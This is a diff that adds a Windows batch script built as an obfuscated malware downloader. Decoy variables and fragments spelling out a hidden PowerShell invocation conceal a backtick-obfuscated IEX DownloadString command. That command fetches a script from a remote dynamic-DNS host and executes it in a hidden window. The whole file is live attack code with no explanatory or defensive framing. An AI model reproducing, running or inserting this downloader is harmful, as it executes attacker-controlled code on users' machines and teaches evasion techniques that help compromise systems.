@@ -1,0 +1,45 @@
+@echo off
+cd %SystemRoot%\System32
+set q=e6O9t4v0x0m9_7VMfJuxhScD
+set r=_3_1_0_5_5_6Q0KLMkOWkuqy
+set s=D0x9_7d4_9J1_6dojcltzILs
+set t=_1_3_6_5q4_5_8WiEhKakWDb
+set u=_3m1S0R0_4_8_7VFDDduuvjX
+set v=_4t4_9V6M2_8_5mmcedXKkvX
+set x=_6e9_8l8_0_3_0sWWgFqINEP
+set y=V5W7y0_5G3O0_4FplGLgysUZ
+set z=_0v9_4_5L8_0_7XiKzeCTEMn
+set a=Win
+set za=_9_6t8_1r6_6_8uXJwNEOWjN
+set b=dow
+set ze=_4K0_6_2_4_6_8SDbHJFgMNn
+set c=sPo
+set ze=Q2_5_6_3_4_3e3BJxeZaiDeh
+set d=wer
+set ze=_8N9_8_9E5u0_8hEdrllNMCg
+set e=She
+set ze=b8u5_2_8l9M3r2OMYRNZZbCF
+set f=ll\
+set ze=H0V7h7_5Q4_9_1RRZoIPDJTe
+set g=v1.
+set ze=_7_3k6_9X0_4k8tppmVfsqOY
+set h=0\po
+set ze=_8_2J4_3_3V6_1eFnFZNSfVd
+set i=we
+set ze=d1_4h4_6_7T4_6sRbVWwTyNH
+set j=rsh
+set ze=_3_9J1_4_6_2_9aoAZreJVtb
+set k=ell
+set ze=G9v1K2_7W5L0q0iSLfgIzota
+set l=.ex
+set ze=c3_8L8_7l7_0m2LkHcRyIxoh
+set m=e -n
+set ze=q7Q7q4_7X0_6G0HnHSouEdlr
+set n=op 
+set ze=_6_7_0_1_2S9_5WJHBqDOlgD
+set o=-w
+set ze=T1b1_0_7C0c8_8EpTHBjjtSK
+set p=in 1 -
+set ze=c1_1_5g3_5_9C3roYBDqXDex
+echo ieX("Ie`X`(N`ew-oBJ`e`Ct N`et.`Web`ClIeNt`).DOwnlOa`d`StRIN`G('http://housecheese1.serveblog.net/_5w8_4_3f6_3R3kdemx/_5w8_4_3f6_3R3kde/_5w8_4_3f6_3R3kdekk/_5w8_4_3f6_3R3kde')"); | %a%%b%%c%%d%%e%%f%%g%%h%%i%%j%%k%%l%%m%%n%%o%%p%
+set ze=_9_4_4G9_1k2_2PrbARnSEns
